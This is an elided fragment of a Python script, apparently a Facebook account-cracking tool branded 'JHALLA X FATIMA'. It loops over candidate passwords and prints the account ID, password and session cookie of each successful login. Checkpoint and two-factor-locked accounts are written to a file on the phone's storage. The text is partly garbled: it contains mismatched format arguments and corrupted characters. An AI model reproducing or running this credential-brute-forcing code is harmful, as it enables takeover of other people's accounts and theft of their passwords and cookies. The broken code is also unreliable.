...
\______/      )_(      \_/
        ...
        [  JHALLA X FATIMA  ]
         AUTHOR : JHALLA X FATIMA
       FACEBOOK : JHALLA BARND
         GITHUB : JHALLA11
      YOUTUBE : JHALLA TRICK ZONE
    TOOL STATUS : FREE USE KRO 9T7 BARND KI TRAF SY
...
def checks(oks,cps,twf):
    if not len(oks) != 0:
        pass
    if len(cps) != 0:
        print('\n\n\x1b[1;97m TOTAL OK : \x1b[1;97m %s  \x1b[1;97mJHALLA-OK.txt' % (
            H, P, str(len(oks))))
        print('\x1b[1;97m TOTAL CP :\x1b[1;97m   %s \x1b[1;97mJHALLA-CP.txt' %
              (H, P, str(len(cps))))
        print('\x1b[1;97m TOTAL 2F :\x1b[1;97m   %s \x1b[1;97mJHALLA-2F.txt' %
              (H, P, str(len(twf))))
...
def cek_apk(session,coki):
    ...
    #____________#
def xyz():
    os.system("play-audio WELCOME_TO_JHALLA_BOOT_818.mp3")
    os.getuid
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\033[1;32m[âˆš]---------------------[JHALLA-OK]--------------------[âˆš]\nNUMBER : '+uid+'\nUID   : '+cid+' âˆš '+ps+ '\nCOOKIE   : '+coki+'\n[âˆš]---------------------------------------------------[âˆš]')
                ...
                cid=coki[7:22]
                Red = '\033[1;31m'
                print(f'\r{YELLOW}[JHALLA-LOCK] '+cid+' | '+ps+'\033[1;97m')
                open('/sdcard/JHALLA-2F.txt', 'a').write(cid+' | '+ps+'\n')
                twf.append(cid)
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[JHALLA ] [%s]\33[1;97m [OK:%s~CP:%s]'%(loop,len(oks),len(cps))), 
        sys.stdout.flush()
        checks(oks,cps,twf)
    except:
        pass
